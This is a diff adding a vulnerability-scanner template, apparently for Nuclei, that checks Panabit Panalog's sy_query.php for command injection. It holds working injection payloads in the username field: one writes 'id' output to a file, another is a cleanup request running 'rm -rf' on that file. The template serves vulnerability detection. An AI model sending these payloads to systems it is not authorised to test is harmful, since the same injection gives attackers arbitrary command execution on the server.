@@ -1,0 +1,56 @@
+id: panabit-panalog-sy_query-rce
+info:
+  name: Panabit Panalog sy_query.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Panabit Panalog sy_query.php has a remote command execution vulnerability that allows attackers to execute arbitrary commands to take over server permissions.
+  tags: rce, command-execution
+  reference:
+    - https://www.panabit.com
+
+variables:
+  randomStr: "{{rand_base(8)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        POST /account/sy_query.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=;id>{{randomStr}}.txt
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /account/{{randomStr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid"
+        part: body
+
+  - raw:
+      - |
+        POST /account/sy_query.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=;rm%20-rf%20{{randomStr}}.txt
+    matchers:
+      - type: status
+        status:
+          - 200
